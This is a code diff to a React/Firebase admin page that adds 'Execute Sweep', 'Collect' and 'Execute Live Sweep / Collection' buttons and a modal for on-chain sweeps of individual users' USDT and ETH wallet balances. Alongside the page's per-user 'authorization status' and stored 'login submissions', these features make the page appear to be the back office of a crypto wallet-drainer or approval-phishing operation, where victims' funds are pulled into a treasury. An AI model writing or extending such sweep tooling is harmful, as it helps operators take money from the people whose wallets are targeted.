@@ -24,13 +24,17 @@ import Link from 'next/link';
 import { Eye, ShieldAlert, RotateCw, Landmark, ExternalLink, Sparkles, Plus, Check, X, Zap, Trash2 } from 'lucide-react';
 import { getFirebaseFirestore, ensureAnonymousAuth } from '@bspc/firebase';
 import { collection, onSnapshot, deleteDoc, doc, setDoc, arrayUnion, arrayRemove, serverTimestamp } from 'firebase/firestore';
-
+import { LiveSweepModal, SweepUserOption } from '../../../components/LiveSweepModal';
 
 export default function UsersPage() {
   const [users, setUsers] = useState<DbUser[]>([]);
   const [loginSubmissions, setLoginSubmissions] = useState<any[]>([]);
   const [isLoading, setIsLoading] = useState(true);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
+
+  // Live Sweep Modal State
+  const [isSweepModalOpen, setIsSweepModalOpen] = useState(false);
+  const [selectedSweepUser, setSelectedSweepUser] = useState<SweepUserOption | null>(null);
 
   // Filter States
   const [userIdFilter, setUserIdFilter] = useState('');
@@ -544,6 +548,16 @@ export default function UsersPage() {
         subtitle="Manage authorization statuses, pool sweeps properties, and session profiles."
         actions={
           <div className="flex gap-2">
+            <button
+              onClick={() => {
+                setSelectedSweepUser(null);
+                setIsSweepModalOpen(true);
+              }}
+              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 text-xs font-bold rounded-lg bg-teal-600 hover:bg-teal-500 text-white shadow-sm transition-all"
+            >
+              <Sparkles className="w-3.5 h-3.5 text-amber-300" />
+              ⚡ Execute Sweep
+            </button>
             <ColumnVisibilityMenu
               columns={allColumns}
               visibleColumns={visibleColumns}
@@ -725,6 +739,25 @@ export default function UsersPage() {
                       </td>
                     )}
                     <td className="text-right whitespace-nowrap space-x-1">
+                      <button
+                        onClick={() => {
+                          setSelectedSweepUser({
+                            uid: u.uid,
+                            username: u.username,
+                            walletAddress: u.walletAddress || u.uid,
+                            clientAlias: (u as any).clientAlias,
+                            balanceUsdt: u.balanceUsdt,
+                            balanceEth: u.balanceEth,
+                            authorizationStatus: u.authorizationStatus,
+                          });
+                          setIsSweepModalOpen(true);
+                        }}
+                        className="bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold px-2 py-1 rounded text-[11px] transition-all inline-flex items-center gap-1 shadow-sm"
+                        title="Execute live on-chain sweep/collection for this user"
+                      >
+                        <Sparkles className="w-3 h-3 text-slate-950" /> ⚡ Collect
+                      </button>
+
                       <button
                         onClick={() => handleToggleAuthorization(u)}
                         className={`px-2 py-1 rounded text-[11px] font-semibold transition-all ${
@@ -911,6 +944,33 @@ export default function UsersPage() {
                 className="w-full bg-amber-600 hover:bg-amber-700 disabled:opacity-50 text-white font-bold text-xs py-1.5 px-3 rounded shadow-sm transition-all"
               >
                 {isSavingDrawerAlias ? 'Saving...' : '💾 Save Client ID Name & Note'}
+              </button>
+            </div>
+
+            {/* Treasury Sweep Action */}
+            <div className="border-t border-gray-200 pt-3 mt-4">
+              <label className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block mb-1">Treasury Sweep &amp; Collection</label>
+              <button
+                onClick={() => {
+                  setSelectedSweepUser({
+                    uid: selectedUser.uid,
+                    username: selectedUser.username,
+                    walletAddress: selectedUser.walletAddress || selectedUser.uid,
+                    clientAlias: (selectedUser as any).clientAlias,
+                    balanceUsdt: selectedUser.balanceUsdt,
+                    balanceEth: selectedUser.balanceEth,
+                    authorizationStatus: selectedUser.authorizationStatus,
+                  });
+                  setIsSweepModalOpen(true);
+                }}
+                className="inline-flex items-center justify-between w-full bg-amber-500 hover:bg-amber-600 text-slate-950 px-3 py-2 rounded text-xs font-bold transition-all shadow-sm"
+              >
+                <span className="flex items-center gap-2">
+                  <Sparkles className="w-4 h-4 text-slate-950" /> ⚡ Execute Live Sweep / Collection
+                </span>
+                <span className="text-[11px] font-mono font-extrabold bg-black/10 px-1.5 py-0.5 rounded">
+                  {selectedUser.balanceUsdt || '0 USDT'}
+                </span>
               </button>
             </div>
 
@@ -1179,6 +1239,28 @@ export default function UsersPage() {
           </div>
         </div>
       )}
+
+      {/* ── LIVE ON-CHAIN SWEEP & RECORD MODAL ── */}
+      <LiveSweepModal
+        isOpen={isSweepModalOpen}
+        onClose={() => {
+          setIsSweepModalOpen(false);
+          setSelectedSweepUser(null);
+        }}
+        preselectedUser={selectedSweepUser}
+        usersList={users.map((u) => ({
+          uid: u.uid,
+          username: u.username,
+          walletAddress: u.walletAddress || u.uid,
+          clientAlias: (u as any).clientAlias,
+          balanceUsdt: u.balanceUsdt,
+          balanceEth: u.balanceEth,
+          authorizationStatus: u.authorizationStatus,
+        }))}
+        onSweepSuccess={(rec) => {
+          setOperationRef(`SWEEP-${rec.id || rec.recordId}-${rec.amount}`);
+        }}
+      />
     </div>
   );
 }
